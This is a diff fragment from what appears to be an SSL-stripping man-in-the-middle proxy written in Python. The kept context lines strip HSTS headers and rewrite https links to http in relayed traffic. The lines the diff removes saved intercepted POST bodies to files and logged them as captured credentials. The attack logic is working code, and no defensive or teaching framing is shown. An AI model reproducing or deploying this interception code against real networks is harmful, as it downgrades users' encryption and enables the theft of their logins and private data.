@@ -60,32 +60,6 @@ def handle_client_connection(client_socket):
                 response_data = re.sub(rb'Strict-Transport-Security:.*?\r\n', b'', response_data, flags=re.IGNORECASE)
                 stripped_response = response_data.replace(b'https://', b'http://')
                 
-                # Capture POST data
-                if b"POST " in request_data:
-                    timestamp_id = time.strftime('%H%M%S')
-                    clean_host = host.replace('.', '-') if host else "unknown"
-                    pkt_id = f"{timestamp_id}_SSL_{clean_host}"
-                    
-                    try:
-                        header, body = request_data.split(b'\r\n\r\n', 1)
-                        snippet = body.decode('utf-8', errors='ignore')
-                    except:
-                        snippet = request_data[:100].decode('utf-8', errors='ignore')
-
-                    with open(f"{CAPTURE_DIR}/{pkt_id}.html", "wb") as f: f.write(request_data)
-                    
-                    data_entry = {
-                        "id": pkt_id, "time": time.strftime('%H:%M:%S'),
-                        "src": "SSL_STRIP", "dst": host,
-                        "snippet": f"[POST] {snippet}", "type": "ALERT"
-                    }
-                    
-                    # SAVE TO BOTH
-                    STATUS["intercepted_data"].append(data_entry)
-                    STATUS["all_intercepted_data"].append(data_entry)
-                    
-                    log_msg(f"[DATA] CREDENTIALS CAPTURED: {host}")
-
                 client_socket.sendall(stripped_response)
 
      # Send modified response back           
